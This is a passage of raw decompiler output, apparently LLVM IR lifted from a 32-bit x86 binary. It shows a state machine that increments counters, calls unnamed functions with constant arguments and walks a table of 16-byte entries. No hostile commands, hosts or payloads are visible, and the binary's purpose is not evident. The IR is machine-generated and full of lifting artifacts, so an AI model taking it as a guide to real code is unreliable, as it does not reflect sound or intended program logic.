  %v2_8050c72 = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050c72, i32* %eax.global-to-local, align 4
  %v0_8050c7a = load i32, i32* @edi, align 4
  %v1_8050c7a = add i32 %v0_8050c7a, 12
  %v2_8050c7a = inttoptr i32 %v1_8050c7a to i32*
  store i32 7, i32* %v2_8050c7a, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050c86:                             ; preds = %dec_label_pc_8050a07, %dec_label_pc_80509fe, %dec_label_pc_80509f5, %dec_label_pc_80509ec, %dec_label_pc_80509df
  %v1_8050c86 = add i32 %v0_8050c86, 1
  store i32 %v1_8050c86, i32* @ebp, align 4
  %v10_8050c89 = icmp eq i32 %v0_8050c86, -2
  br i1 %v10_8050c89, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050c92

dec_label_pc_8050c92:                             ; preds = %dec_label_pc_8050c86
  %tmp151 = icmp slt i32 %v1_8050c86, 1
  br i1 %tmp151, label %dec_label_pc_8050a23, label %dec_label_pc_8050c9a

dec_label_pc_8050c9a:                             ; preds = %dec_label_pc_8050c92
  %v0_8050c9a = load i32, i32* @esp, align 4
  %v1_8050c9d = add i32 %v0_8050c9a, -16
  %v2_8050c9d = inttoptr i32 %v1_8050c9d to i32*
  store i32 24, i32* %v2_8050c9d, align 4
  %v2_8050c9f = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050c9f, i32* %eax.global-to-local, align 4
  %v0_8050ca4 = load i32, i32* @esp, align 4
  %v1_8050ca4 = inttoptr i32 %v0_8050ca4 to i32*
  %v2_8050ca4 = load i32, i32* %v1_8050ca4, align 4
  store i32 %v2_8050ca4, i32* %eax.global-to-local, align 4
  %v3_8050ca4 = add i32 %v0_8050ca4, 4
  %v1_8050ca5 = inttoptr i32 %v3_8050ca4 to i32*
  %v1_8050ca6 = add i32 %v0_8050ca4, 1880
  store i32 %v1_8050ca6, i32* %edx.global-to-local, align 4
  store i32 %v1_8050ca6, i32* %v1_8050ca5, align 4
  store i32 24, i32* %v1_8050ca4, align 4
  %v3_8050cb0 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050cb0, i32* %eax.global-to-local, align 4
  %v0_8050cb5 = load i32, i32* @esp, align 4
  %v1_8050cb5 = add i32 %v0_8050cb5, -4
  %v2_8050cb5 = inttoptr i32 %v1_8050cb5 to i32*
  store i32 16384, i32* %v2_8050cb5, align 4
  %v1_8050cba = add i32 %v0_8050cb5, 1880
  %v2_8050cba = inttoptr i32 %v1_8050cba to i32*
  %v3_8050cba = load i32, i32* %v2_8050cba, align 4
  store i32 %v3_8050cba, i32* @esi, align 4
  %v2_8050cc1 = add i32 %v0_8050cb5, -8
  %v3_8050cc1 = inttoptr i32 %v2_8050cc1 to i32*
  store i32 %v3_8050cba, i32* %v3_8050cc1, align 4
  %v2_8050cc2 = add i32 %v0_8050cb5, -12
  %v3_8050cc2 = inttoptr i32 %v2_8050cc2 to i32*
  store i32 %v3_8050cb0, i32* %v3_8050cc2, align 4
  %v0_8050cc3 = load i32, i32* @edi, align 4
  %v1_8050cc3 = add i32 %v0_8050cc3, 4
  %v2_8050cc3 = inttoptr i32 %v1_8050cc3 to i32*
  %v3_8050cc3 = load i32, i32* %v2_8050cc3, align 4
  store i32 %v3_8050cc3, i32* @ebx, align 4
  %v2_8050cc6 = add i32 %v0_8050cb5, -16
  %v3_8050cc6 = inttoptr i32 %v2_8050cc6 to i32*
  store i32 %v3_8050cc3, i32* %v3_8050cc6, align 4
  %v0_8050cc7 = call i32 @function_80528d4()
  store i32 %v0_8050cc7, i32* %eax.global-to-local, align 4
  %v0_8050ccc = load i32, i32* @esp, align 4
  %v1_8050ccf = add i32 %v0_8050ccc, 28
  %v2_8050ccf = inttoptr i32 %v1_8050ccf to i32*
  store i32 16384, i32* %v2_8050ccf, align 4
  %v1_8050cd4 = add i32 %v0_8050ccc, 24
  %v2_8050cd4 = inttoptr i32 %v1_8050cd4 to i32*
  store i32 2, i32* %v2_8050cd4, align 4
  %v1_8050cd6 = add i32 %v0_8050ccc, 20
  %v2_8050cd6 = inttoptr i32 %v1_8050cd6 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050cd6, align 4
  %v0_8050cdb = load i32, i32* @edi, align 4
  %v1_8050cdb = add i32 %v0_8050cdb, 4
  %v2_8050cdb = inttoptr i32 %v1_8050cdb to i32*
  %v3_8050cdb = load i32, i32* %v2_8050cdb, align 4
  store i32 %v3_8050cdb, i32* %ecx.global-to-local, align 4
  %v2_8050cde = add i32 %v0_8050ccc, 16
  %v3_8050cde = inttoptr i32 %v2_8050cde to i32*
  store i32 %v3_8050cdb, i32* %v3_8050cde, align 4
  %v0_8050cdf = call i32 @function_80528d4()
  store i32 %v0_8050cdf, i32* %eax.global-to-local, align 4
  %v0_8050ce4 = load i32, i32* @esp, align 4
  %v1_8050ce4 = inttoptr i32 %v0_8050ce4 to i32*
  store i32 24, i32* %v1_8050ce4, align 4
  %v2_8050ceb = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050ceb, i32* %eax.global-to-local, align 4
  %v0_8050cf3 = load i32, i32* @edi, align 4
  %v1_8050cf3 = add i32 %v0_8050cf3, 12
  %v2_8050cf3 = inttoptr i32 %v1_8050cf3 to i32*
  store i32 10, i32* %v2_8050cf3, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050cff:                             ; preds = %dec_label_pc_80507b4, %dec_label_pc_80507ab, %dec_label_pc_80507a2, %dec_label_pc_8050799, %dec_label_pc_805078c
  %v1_8050cff = add i32 %v0_8050cff, 1
  store i32 %v1_8050cff, i32* @ebp, align 4
  %v10_8050d02 = icmp eq i32 %v0_8050cff, -2
  br i1 %v10_8050d02, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050d0b

dec_label_pc_8050d0b:                             ; preds = %dec_label_pc_8050cff
  %tmp152 = icmp slt i32 %v1_8050cff, 1
  br i1 %tmp152, label %dec_label_pc_8050a23, label %dec_label_pc_8050d13

dec_label_pc_8050d13:                             ; preds = %dec_label_pc_8050d0b
  %v0_8050d13 = load i32, i32* @esp, align 4
  %v1_8050d16 = add i32 %v0_8050d13, -16
  %v2_8050d16 = inttoptr i32 %v1_8050d16 to i32*
  store i32 23, i32* %v2_8050d16, align 4
  %v2_8050d18 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d18, i32* %eax.global-to-local, align 4
  %v0_8050d1d = load i32, i32* @esp, align 4
  %v1_8050d1d = inttoptr i32 %v0_8050d1d to i32*
  %v2_8050d1d = load i32, i32* %v1_8050d1d, align 4
  store i32 %v2_8050d1d, i32* %eax.global-to-local, align 4
  %v3_8050d1d = add i32 %v0_8050d1d, 4
  %v1_8050d1e = inttoptr i32 %v3_8050d1d to i32*
  %v2_8050d1e = load i32, i32* %v1_8050d1e, align 4
  store i32 %v2_8050d1e, i32* %edx.global-to-local, align 4
  %v1_8050d1f = add i32 %v0_8050d1d, 1880
  store i32 %v1_8050d1f, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d1f, i32* %v1_8050d1e, align 4
  store i32 23, i32* %v1_8050d1d, align 4
  %v3_8050d29 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d29, i32* %eax.global-to-local, align 4
  %v0_8050d2e = load i32, i32* @esp, align 4
  %v1_8050d2e = add i32 %v0_8050d2e, -4
  %v2_8050d2e = inttoptr i32 %v1_8050d2e to i32*
  store i32 16384, i32* %v2_8050d2e, align 4
  %v1_8050d33 = add i32 %v0_8050d2e, 1880
  %v2_8050d33 = inttoptr i32 %v1_8050d33 to i32*
  %v3_8050d33 = load i32, i32* %v2_8050d33, align 4
  store i32 %v3_8050d33, i32* @esi, align 4
  %v2_8050d3a = add i32 %v0_8050d2e, -8
  %v3_8050d3a = inttoptr i32 %v2_8050d3a to i32*
  store i32 %v3_8050d33, i32* %v3_8050d3a, align 4
  %v2_8050d3b = add i32 %v0_8050d2e, -12
  %v3_8050d3b = inttoptr i32 %v2_8050d3b to i32*
  store i32 %v3_8050d29, i32* %v3_8050d3b, align 4
  %v0_8050d3c = load i32, i32* @edi, align 4
  %v1_8050d3c = add i32 %v0_8050d3c, 4
  %v2_8050d3c = inttoptr i32 %v1_8050d3c to i32*
  %v3_8050d3c = load i32, i32* %v2_8050d3c, align 4
  store i32 %v3_8050d3c, i32* @ebx, align 4
  %v2_8050d3f = add i32 %v0_8050d2e, -16
  %v3_8050d3f = inttoptr i32 %v2_8050d3f to i32*
  store i32 %v3_8050d3c, i32* %v3_8050d3f, align 4
  %v0_8050d40 = call i32 @function_80528d4()
  store i32 %v0_8050d40, i32* %eax.global-to-local, align 4
  %v0_8050d45 = load i32, i32* @esp, align 4
  %v1_8050d48 = add i32 %v0_8050d45, 28
  %v2_8050d48 = inttoptr i32 %v1_8050d48 to i32*
  store i32 16384, i32* %v2_8050d48, align 4
  %v1_8050d4d = add i32 %v0_8050d45, 24
  %v2_8050d4d = inttoptr i32 %v1_8050d4d to i32*
  store i32 2, i32* %v2_8050d4d, align 4
  %v1_8050d4f = add i32 %v0_8050d45, 20
  %v2_8050d4f = inttoptr i32 %v1_8050d4f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050d4f, align 4
  %v0_8050d54 = load i32, i32* @edi, align 4
  %v1_8050d54 = add i32 %v0_8050d54, 4
  %v2_8050d54 = inttoptr i32 %v1_8050d54 to i32*
  %v3_8050d54 = load i32, i32* %v2_8050d54, align 4
  store i32 %v3_8050d54, i32* %ecx.global-to-local, align 4
  %v2_8050d57 = add i32 %v0_8050d45, 16
  %v3_8050d57 = inttoptr i32 %v2_8050d57 to i32*
  store i32 %v3_8050d54, i32* %v3_8050d57, align 4
  %v0_8050d58 = call i32 @function_80528d4()
  store i32 %v0_8050d58, i32* %eax.global-to-local, align 4
  %v0_8050d5d = load i32, i32* @esp, align 4
  %v1_8050d5d = inttoptr i32 %v0_8050d5d to i32*
  store i32 23, i32* %v1_8050d5d, align 4
  %v2_8050d64 = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d64, i32* %eax.global-to-local, align 4
  %v0_8050d6c = load i32, i32* @edi, align 4
  %v1_8050d6c = add i32 %v0_8050d6c, 12
  %v2_8050d6c = inttoptr i32 %v1_8050d6c to i32*
  store i32 9, i32* %v2_8050d6c, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050d78:                             ; preds = %dec_label_pc_8050577, %dec_label_pc_805056e, %dec_label_pc_8050565, %dec_label_pc_805055c, %dec_label_pc_805054f
  %v1_8050d78 = add i32 %v0_8050d78, 1
  store i32 %v1_8050d78, i32* @ebp, align 4
  %v10_8050d7b = icmp eq i32 %v0_8050d78, -2
  br i1 %v10_8050d7b, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d78
  %tmp153 = icmp slt i32 %v1_8050d78, 1
  br i1 %tmp153, label %dec_label_pc_8050a23, label %dec_label_pc_8050d8c

dec_label_pc_8050d8c:                             ; preds = %dec_label_pc_8050d84
  %v0_8050d8c = load i32, i32* @esp, align 4
  %v1_8050d8f = add i32 %v0_8050d8c, -16
  %v2_8050d8f = inttoptr i32 %v1_8050d8f to i32*
  store i32 21, i32* %v2_8050d8f, align 4
  %v2_8050d91 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d91, i32* %eax.global-to-local, align 4
  %v0_8050d96 = load i32, i32* @esp, align 4
  %v1_8050d96 = inttoptr i32 %v0_8050d96 to i32*
  %v2_8050d96 = load i32, i32* %v1_8050d96, align 4
  store i32 %v2_8050d96, i32* %eax.global-to-local, align 4
  %v3_8050d96 = add i32 %v0_8050d96, 4
  %v1_8050d97 = inttoptr i32 %v3_8050d96 to i32*
  %v2_8050d97 = load i32, i32* %v1_8050d97, align 4
  store i32 %v2_8050d97, i32* %edx.global-to-local, align 4
  %v1_8050d98 = add i32 %v0_8050d96, 1880
  store i32 %v1_8050d98, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050d98, i32* %v1_8050d97, align 4
  store i32 21, i32* %v1_8050d96, align 4
  %v3_8050da2 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050da2, i32* %eax.global-to-local, align 4
  %v0_8050da7 = load i32, i32* @esp, align 4
  %v1_8050da7 = add i32 %v0_8050da7, -4
  %v2_8050da7 = inttoptr i32 %v1_8050da7 to i32*
  store i32 16384, i32* %v2_8050da7, align 4
  %v1_8050dac = add i32 %v0_8050da7, 1880
  %v2_8050dac = inttoptr i32 %v1_8050dac to i32*
  %v3_8050dac = load i32, i32* %v2_8050dac, align 4
  store i32 %v3_8050dac, i32* @esi, align 4
  %v2_8050db3 = add i32 %v0_8050da7, -8
  %v3_8050db3 = inttoptr i32 %v2_8050db3 to i32*
  store i32 %v3_8050dac, i32* %v3_8050db3, align 4
  %v2_8050db4 = add i32 %v0_8050da7, -12
  %v3_8050db4 = inttoptr i32 %v2_8050db4 to i32*
  store i32 %v3_8050da2, i32* %v3_8050db4, align 4
  %v0_8050db5 = load i32, i32* @edi, align 4
  %v1_8050db5 = add i32 %v0_8050db5, 4
  %v2_8050db5 = inttoptr i32 %v1_8050db5 to i32*
  %v3_8050db5 = load i32, i32* %v2_8050db5, align 4
  store i32 %v3_8050db5, i32* @ebx, align 4
  %v2_8050db8 = add i32 %v0_8050da7, -16
  %v3_8050db8 = inttoptr i32 %v2_8050db8 to i32*
  store i32 %v3_8050db5, i32* %v3_8050db8, align 4
  %v0_8050db9 = call i32 @function_80528d4()
  store i32 %v0_8050db9, i32* %eax.global-to-local, align 4
  %v0_8050dbe = load i32, i32* @esp, align 4
  %v1_8050dc1 = add i32 %v0_8050dbe, 28
  %v2_8050dc1 = inttoptr i32 %v1_8050dc1 to i32*
  store i32 16384, i32* %v2_8050dc1, align 4
  %v1_8050dc6 = add i32 %v0_8050dbe, 24
  %v2_8050dc6 = inttoptr i32 %v1_8050dc6 to i32*
  store i32 2, i32* %v2_8050dc6, align 4
  %v1_8050dc8 = add i32 %v0_8050dbe, 20
  %v2_8050dc8 = inttoptr i32 %v1_8050dc8 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050dc8, align 4
  %v0_8050dcd = load i32, i32* @edi, align 4
  %v1_8050dcd = add i32 %v0_8050dcd, 4
  %v2_8050dcd = inttoptr i32 %v1_8050dcd to i32*
  %v3_8050dcd = load i32, i32* %v2_8050dcd, align 4
  store i32 %v3_8050dcd, i32* %ecx.global-to-local, align 4
  %v2_8050dd0 = add i32 %v0_8050dbe, 16
  %v3_8050dd0 = inttoptr i32 %v2_8050dd0 to i32*
  store i32 %v3_8050dcd, i32* %v3_8050dd0, align 4
  %v0_8050dd1 = call i32 @function_80528d4()
  store i32 %v0_8050dd1, i32* %eax.global-to-local, align 4
  %v0_8050dd6 = load i32, i32* @esp, align 4
  %v1_8050dd6 = inttoptr i32 %v0_8050dd6 to i32*
  store i32 21, i32* %v1_8050dd6, align 4
  %v2_8050ddd = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050ddd, i32* %eax.global-to-local, align 4
  %v0_8050de5 = load i32, i32* @edi, align 4
  %v1_8050de5 = add i32 %v0_8050de5, 12
  %v2_8050de5 = inttoptr i32 %v1_8050de5 to i32*
  store i32 6, i32* %v2_8050de5, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050df1:                             ; preds = %dec_label_pc_8050810
  %v2_8050dfb = load i32, i32* %v1_8050dfb, align 4
  store i32 %v2_8050dfb, i32* %eax.global-to-local, align 4
  %v0_8050dfc = load i32, i32* @edi, align 4
  %v1_8050dfc = add i32 %v0_8050dfc, 4
  %v2_8050dfc = inttoptr i32 %v1_8050dfc to i32*
  %v3_8050dfc = load i32, i32* %v2_8050dfc, align 4
  store i32 %v3_8050dfc, i32* %eax.global-to-local, align 4
  store i32 %v3_8050dfc, i32* %v1_8050dfb, align 4
  %v1_8050e00 = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050e00, i32* %eax.global-to-local, align 4
  %v0_8050e05 = load i32, i32* @edi, align 4
  %v1_8050e05 = add i32 %v0_8050e05, 284
  %v2_8050e05 = inttoptr i32 %v1_8050e05 to i8*
  %v3_8050e05 = load i8, i8* %v2_8050e05, align 1
  %v4_8050e05 = zext i8 %v3_8050e05 to i32
  %v6_8050e05 = and i32 %v1_8050e00, -256
  %v7_8050e05 = or i32 %v4_8050e05, %v6_8050e05
  %v1_8050e0e = add i32 %v7_8050e05, 1
  store i32 %v1_8050e0e, i32* %eax.global-to-local, align 4
  %v1_8050e0f = add i32 %v0_8050e05, 4
  %v2_8050e0f = inttoptr i32 %v1_8050e0f to i32*
  store i32 -1, i32* %v2_8050e0f, align 4
  %v0_8050e16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e16 = trunc i32 %v0_8050e16 to i8
  %v2_8050e16 = load i32, i32* @edi, align 4
  %v3_8050e16 = add i32 %v2_8050e16, 284
  %v4_8050e16 = inttoptr i32 %v3_8050e16 to i8*
  store i8 %v1_8050e16, i8* %v4_8050e16, align 1
  %v0_8050e1c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e1c = trunc i32 %v0_8050e1c to i8
  %v10_8050e1c = icmp eq i8 %v1_8050e1c, 10
  %v1_8050e1e = icmp eq i1 %v10_8050e1c, false
  br i1 %v1_8050e1e, label %dec_label_pc_8050fb0, label %dec_label_pc_8050e24

dec_label_pc_8050e24:                             ; preds = %dec_label_pc_8050df1
  store i32 -1, i32* @ebp, align 4
  %v0_8050e27 = load i32, i32* @edi, align 4
  %v1_8050e27 = add i32 %v0_8050e27, 284
  %v2_8050e27 = inttoptr i32 %v1_8050e27 to i8*
  store i8 0, i8* %v2_8050e27, align 1
  %v0_8050e2e = load i32, i32* @edi, align 4
  %v1_8050e2e = add i32 %v0_8050e2e, 12
  %v2_8050e2e = inttoptr i32 %v1_8050e2e to i32*
  store i32 0, i32* %v2_8050e2e, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050e3a:                             ; preds = %dec_label_pc_8050aa4
  %v1_8050e3a = add i32 %v0_8050a90, -4
  %v2_8050e3a = inttoptr i32 %v1_8050e3a to i32*
  store i32 16384, i32* %v2_8050e3a, align 4
  %v1_8050e3f = add i32 %v0_8050a90, -8
  %v2_8050e3f = inttoptr i32 %v1_8050e3f to i32*
  store i32 3, i32* %v2_8050e3f, align 4
  %v1_8050e41 = add i32 %v0_8050a90, 1879
  store i32 %v1_8050e41, i32* %eax.global-to-local, align 4
  %v0_8050e48 = load i32, i32* @ebx, align 4
  %v1_8050e48 = add i32 %v0_8050e48, 3
  store i32 %v1_8050e48, i32* @ebx, align 4
  %v2_8050e4b = add i32 %v0_8050a90, -12
  %v3_8050e4b = inttoptr i32 %v2_8050e4b to i32*
  store i32 %v1_8050e41, i32* %v3_8050e4b, align 4
  %v0_8050e4c = load i32, i32* @ebp, align 4
  %v1_8050e4c = add i32 %v0_8050e4c, 3
  store i32 %v1_8050e4c, i32* @ebp, align 4
  %v0_8050e4f = load i32, i32* @edi, align 4
  %v1_8050e4f = add i32 %v0_8050e4f, 4
  %v2_8050e4f = inttoptr i32 %v1_8050e4f to i32*
  %v3_8050e4f = load i32, i32* %v2_8050e4f, align 4
  store i32 %v3_8050e4f, i32* @esi, align 4
  %v2_8050e52 = add i32 %v0_8050a90, -16
  %v3_8050e52 = inttoptr i32 %v2_8050e52 to i32*
  store i32 %v3_8050e4f, i32* %v3_8050e52, align 4
  %v0_8050e53 = call i32 @function_80528d4()
  %v0_8050e58 = load i32, i32* @esp, align 4
  %v1_8050e58 = add i32 %v0_8050e58, -4
  %v2_8050e58 = inttoptr i32 %v1_8050e58 to i32*
  store i32 16384, i32* %v2_8050e58, align 4
  %v1_8050e5d = add i32 %v0_8050e58, -8
  %v2_8050e5d = inttoptr i32 %v1_8050e5d to i32*
  store i32 9, i32* %v2_8050e5d, align 4
  %v1_8050e5f = add i32 %v0_8050e58, 1863
  store i32 %v1_8050e5f, i32* %eax.global-to-local, align 4
  %v2_8050e66 = add i32 %v0_8050e58, -12
  %v3_8050e66 = inttoptr i32 %v2_8050e66 to i32*
  store i32 %v1_8050e5f, i32* %v3_8050e66, align 4
  %v0_8050e67 = load i32, i32* @edi, align 4
  %v1_8050e67 = add i32 %v0_8050e67, 4
  %v2_8050e67 = inttoptr i32 %v1_8050e67 to i32*
  %v3_8050e67 = load i32, i32* %v2_8050e67, align 4
  store i32 %v3_8050e67, i32* %ecx.global-to-local, align 4
  %v2_8050e6a = add i32 %v0_8050e58, -16
  %v3_8050e6a = inttoptr i32 %v2_8050e6a to i32*
  store i32 %v3_8050e67, i32* %v3_8050e6a, align 4
  %v0_8050e6b = call i32 @function_80528d4()
  store i32 %v0_8050e6b, i32* %eax.global-to-local, align 4
  %v0_8050e70 = load i32, i32* @esp, align 4
  %v1_8050e70 = add i32 %v0_8050e70, 32
  %v0_8050e73 = load i32, i32* @edi, align 4
  %v1_8050e73 = add i32 %v0_8050e73, 24
  %v2_8050e73 = inttoptr i32 %v1_8050e73 to i32*
  %v3_8050e73 = load i32, i32* %v2_8050e73, align 4
  store i32 %v3_8050e73, i32* %edx.global-to-local, align 4
  %v0_805060e.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805060e.backedge

dec_label_pc_8050e7b:                             ; preds = %dec_label_pc_80504fa
  %v1_8050e7b = add i32 %v0_8050504, 1872
  %v2_8050e7b = inttoptr i32 %v1_8050e7b to i32*
  store i32 0, i32* %v2_8050e7b, align 4
  %v0_8050e86 = load i32, i32* @esp, align 4
  %v1_8050e86 = add i32 %v0_8050e86, 1864
  %v2_8050e86 = inttoptr i32 %v1_8050e86 to i32*
  store i32 4, i32* %v2_8050e86, align 4
  %v0_8050e91 = load i32, i32* @esp, align 4
  %v1_8050e94 = add i32 %v0_8050e91, 1864
  %v2_8050e9b = add i32 %v0_8050e91, -16
  %v3_8050e9b = inttoptr i32 %v2_8050e9b to i32*
  store i32 %v1_8050e94, i32* %v3_8050e9b, align 4
  %v1_8050e9c = add i32 %v0_8050e91, 1872
  store i32 %v1_8050e9c, i32* %eax.global-to-local, align 4
  %v2_8050ea3 = add i32 %v0_8050e91, -20
  %v3_8050ea3 = inttoptr i32 %v2_8050ea3 to i32*
  store i32 %v1_8050e9c, i32* %v3_8050ea3, align 4
  %v1_8050ea4 = add i32 %v0_8050e91, -24
  %v2_8050ea4 = inttoptr i32 %v1_8050ea4 to i32*
  store i32 4, i32* %v2_8050ea4, align 4
  %v1_8050ea6 = add i32 %v0_8050e91, -28
  %v2_8050ea6 = inttoptr i32 %v1_8050ea6 to i32*
  store i32 1, i32* %v2_8050ea6, align 4
  %v0_8050ea8 = load i32, i32* @edi, align 4
  %v1_8050ea8 = add i32 %v0_8050ea8, 4
  %v2_8050ea8 = inttoptr i32 %v1_8050ea8 to i32*
  %v3_8050ea8 = load i32, i32* %v2_8050ea8, align 4
  store i32 %v3_8050ea8, i32* %eax.global-to-local, align 4
  %v2_8050eab = add i32 %v0_8050e91, -32
  %v3_8050eab = inttoptr i32 %v2_8050eab to i32*
  store i32 %v3_8050ea8, i32* %v3_8050eab, align 4
  %v0_8050eac = call i32 @function_8052800()
  store i32 %v0_8050eac, i32* %eax.global-to-local, align 4
  %v0_8050eb1 = load i32, i32* @esp, align 4
  %v2_8050eb4 = add i32 %v0_8050eb1, 1904
  %v3_8050eb4 = inttoptr i32 %v2_8050eb4 to i32*
  %v4_8050eb4 = load i32, i32* %v3_8050eb4, align 4
  %v5_8050eb4 = or i32 %v4_8050eb4, %v0_8050eac
  %v6_8050eb4 = icmp eq i32 %v5_8050eb4, 0
  store i32 %v5_8050eb4, i32* %eax.global-to-local, align 4
  %v1_8050ebb = icmp eq i1 %v6_8050eb4, false
  br i1 %v1_8050ebb, label %dec_label_pc_8050f1c, label %dec_label_pc_8050ebd

dec_label_pc_8050ebd:                             ; preds = %dec_label_pc_8050e7b
  %v0_8050ebd = load i32, i32* @edi, align 4
  %v1_8050ebd = add i32 %v0_8050ebd, 12
  %v2_8050ebd = inttoptr i32 %v1_8050ebd to i32*
  store i32 2, i32* %v2_8050ebd, align 4
  %v1_8050ec4 = call i32 @function_804f020(i32 ptrtoint (i32* @0 to i32))
  %v2_8050ec4 = sext i32 %v1_8050ec4 to i64
  %v0_8050ec9 = load i16, i16* @global_var_80568ec.49, align 4
  %v1_8050ec9 = zext i16 %v0_8050ec9 to i32
  %v0_8050ed6 = load i32, i32* @global_var_80568b8.50, align 8
  store i32 %v0_8050ed6, i32* @ebx, align 4
  store i32 %v1_8050ec9, i32* %ecx.global-to-local, align 4
  %v8_8050ee0 = zext i16 %v0_8050ec9 to i64
  %v9_8050ee0 = udiv i64 %v2_8050ec4, %v8_8050ee0
  %v10_8050ee0 = trunc i64 %v9_8050ee0 to i32
  store i32 %v10_8050ee0, i32* %eax.global-to-local, align 4
  %v11_8050ee0 = urem i64 %v2_8050ec4, %v8_8050ee0
  %v12_8050ee0 = trunc i64 %v11_8050ee0 to i32
  store i32 %v12_8050ee0, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_8050ed6, 1
  br i1 %tmp154, label %dec_label_pc_8050fe1, label %dec_label_pc_8050eea

dec_label_pc_8050eea:                             ; preds = %dec_label_pc_8050ebd
  %v0_8050eea = load i32, i32* @global_var_80568e8.51, align 8
  store i32 %v0_8050eea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8050eff = trunc i64 %v11_8050ee0 to i16
  br label %dec_label_pc_8050eff

dec_label_pc_8050ef3:                             ; preds = %dec_label_pc_8050f05, %dec_label_pc_8050eff
  %v1_8050ef3 = add i32 %v0_8050ef3, 1
  store i32 %v1_8050ef3, i32* %ecx.global-to-local, align 4
  %v1_8050ef4 = add i32 %v0_8050ef4, 16
  store i32 %v1_8050ef4, i32* %eax.global-to-local, align 4
  %v12_8050ef7 = icmp eq i32 %v1_8050ef3, %v0_8050ed6
  br i1 %v12_8050ef7, label %dec_label_pc_8050fe1.loopexit, label %dec_label_pc_8050eff

dec_label_pc_8050eff:                             ; preds = %dec_label_pc_8050ef3, %dec_label_pc_8050eea
  %v0_8050ef3 = phi i32 [ %v1_8050ef3, %dec_label_pc_8050ef3 ], [ 0, %dec_label_pc_8050eea ]
  %v0_8050ef4 = phi i32 [ %v1_8050ef4, %dec_label_pc_8050ef3 ], [ %v0_8050eea, %dec_label_pc_8050eea ]
  %v3_8050eff = add i32 %v0_8050ef4, 8
  %v4_8050eff = inttoptr i32 %v3_8050eff to i16*
  %v5_8050eff = load i16, i16* %v4_8050eff, align 2
  %v11_8050eff = icmp ult i16 %v1_8050eff, %v5_8050eff
  br i1 %v11_8050eff, label %dec_label_pc_8050ef3, label %dec_label_pc_8050f05

dec_label_pc_8050f05:                             ; preds = %dec_label_pc_8050eff
  %v3_8050f05 = add i32 %v0_8050ef4, 10
  %v4_8050f05 = inttoptr i32 %v3_8050f05 to i16*
  %v5_8050f05 = load i16, i16* %v4_8050f05, align 2
  %v11_8050f05 = icmp ult i16 %v1_8050eff, %v5_8050f05
  %v1_8050f09 = icmp eq i1 %v11_8050f05, false
  br i1 %v1_8050f09, label %dec_label_pc_8050ef3, label %dec_label_pc_8050f0b.loopexit

dec_label_pc_8050f0b.loopexit:                    ; preds = %dec_label_pc_8050f05
  br label %dec_label_pc_8050f0b

dec_label_pc_8050f0b:                             ; preds = %dec_label_pc_8050f0b.loopexit, %dec_label_pc_8050fe1
  %v0_8050f0e = phi i32 [ %v0_8050ef4, %dec_label_pc_8050f0b.loopexit ], [ 0, %dec_label_pc_8050fe1 ]
  %v0_8050f0b = load i32, i32* @edi, align 4
  %v1_8050f0b = add i32 %v0_8050f0b, 4
  %v2_8050f0b = inttoptr i32 %v1_8050f0b to i32*
  %v3_8050f0b = load i32, i32* %v2_8050f0b, align 4
  store i32 %v3_8050f0b, i32* %ecx.global-to-local, align 4
  %v2_8050f0e = inttoptr i32 %v0_8050f0b to i32*
  store i32 %v0_8050f0e, i32* %v2_8050f0e, align 4
  %v0_8050f10 = load i32, i32* @edi, align 4
  %v1_8050f10 = add i32 %v0_8050f10, 24
  %v2_8050f10 = inttoptr i32 %v1_8050f10 to i32*
  store i32 0, i32* %v2_8050f10, align 4
  %v0_8050517.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805051f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050517

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050e7b
  %v0_8050f1f = load i32, i32* @edi, align 4
  %v1_8050f1f = add i32 %v0_8050f1f, 4
  %v2_8050f1f = inttoptr i32 %v1_8050f1f to i32*
  %v3_8050f1f = load i32, i32* %v2_8050f1f, align 4
  store i32 %v3_8050f1f, i32* %eax.global-to-local, align 4
  %v2_8050f22 = add i32 %v0_8050eb1, 16
  %v3_8050f22 = inttoptr i32 %v2_8050f22 to i32*
  store i32 %v3_8050f1f, i32* %v3_8050f22, align 4
  %v1_8050f23 = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050f23, i32* %eax.global-to-local, align 4
  %v0_8050f2b = load i32, i32* @edi, align 4
